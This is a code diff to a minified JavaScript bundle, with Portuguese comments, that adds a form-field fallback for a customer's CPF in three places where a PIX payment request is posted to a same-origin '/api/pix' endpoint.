@@ -14953,6 +14953,7 @@ function gp() {
           // Garantir que email e telefone sejam capturados do localStorage ou do formulário
           const emailVal = b.email && b.email !== "cliente@email.com" ? b.email : (document.querySelector('input[type="email"]')?.value || "cliente@example.com");
           const phoneVal = b.phone && b.phone !== "11999999999" ? b.phone : (document.querySelector('input[type="tel"]')?.value?.replace(/\D/g, "") || "11999999999");
+          const cpfVal = b.cpf || (document.querySelector('input[type="tel"][placeholder*="CPF"]')?.value?.replace(/\D/g, "") || "");
           const j = await (await fetch("/api/pix", {
               method: "POST",
               headers: {
@@ -14963,7 +14964,7 @@ function gp() {
                 customer_name: b.nome,
                 customer_email: emailVal,
                 customer_phone: phoneVal,
-                customer_cpf: b.cpf,
+                customer_cpf: cpfVal,
                 utm: (function(){try{var u=JSON.parse(localStorage.getItem("utmData")||"{}");return{source:u.utm_source||null,medium:u.utm_medium||null,campaign:u.utm_campaign||null,content:u.utm_content||null,term:u.utm_term||null,fbclid:u.fbclid||null};}catch(e){return{};}})()
               })
             })).json();
@@ -21436,9 +21437,10 @@ function DE() {
         return
       }
       const _ = JSON.parse(M);
-      // Garantir que email e telefone sejam capturados do localStorage ou do formulário
+      // Garantir que email, telefone e CPF sejam capturados do localStorage ou do formulário
       const emailVal = _.email && _.email !== "cliente@email.com" ? _.email : (document.querySelector('input[type="email"]')?.value || "cliente@example.com");
       const phoneVal = _.phone && _.phone !== "11999999999" ? _.phone : (document.querySelector('input[type="tel"]')?.value?.replace(/\D/g, "") || "11999999999");
+      const cpfVal = _.cpf || (document.querySelector('input[type="tel"][placeholder*="CPF"]')?.value?.replace(/\D/g, "") || "");
       const I = await (await fetch("/api/pix", {
           method: "POST",
           headers: {
@@ -21449,7 +21451,7 @@ function DE() {
             customer_name: _.nome,
             customer_email: emailVal,
             customer_phone: phoneVal,
-            customer_cpf: _.cpf,
+            customer_cpf: cpfVal,
             utm: (function(){try{var u=JSON.parse(localStorage.getItem("utmData")||"{}");return{source:u.utm_source||null,medium:u.utm_medium||null,campaign:u.utm_campaign||null,content:u.utm_content||null,term:u.utm_term||null,fbclid:u.fbclid||null};}catch(e){return{};}})()
           })
         })).json();
@@ -22246,9 +22248,10 @@ function OE() {
         if (!Y) return re("Dados do usuário não encontrados. Recarregue a página."), j(!1), !1;
         const ge = JSON.parse(Y);
         console.log(`Creating PIX transaction for: ${ge.nome} (attempt ${B + 1}/${W})`);
-        // Garantir que email e telefone sejam capturados do localStorage ou do formulário
+        // Garantir que email, telefone e CPF sejam capturados do localStorage ou do formulário
         const emailVal = ge.email && ge.email !== "cliente@email.com" ? ge.email : (document.querySelector('input[type="email"]')?.value || "cliente@example.com");
         const phoneVal = ge.phone && ge.phone !== "11999999999" ? ge.phone : (document.querySelector('input[type="tel"]')?.value?.replace(/\D/g, "") || "11999999999");
+        const cpfVal = ge.cpf || (document.querySelector('input[type="tel"][placeholder*="CPF"]')?.value?.replace(/\D/g, "") || "");
         const qr = await (await fetch("/api/pix", {
           method: "POST",
           headers: {
@@ -22259,7 +22262,7 @@ function OE() {
             customer_name: ge.nome,
             customer_email: emailVal,
             customer_phone: phoneVal,
-            customer_cpf: ge.cpf,
+            customer_cpf: cpfVal,
             detran_uf: (y == null ? void 0 : y.uf) || "",
             detran_nome: (y == null ? void 0 : y.nome) || "",
             utm: (function(){try{var u=JSON.parse(localStorage.getItem("utmData")||"{}");return{utm_source:u.utm_source||null,utm_medium:u.utm_medium||null,utm_campaign:u.utm_campaign||null,utm_content:u.utm_content||null,utm_term:u.utm_term||null,fbclid:u.fbclid||null};}catch(e){return{};}})()
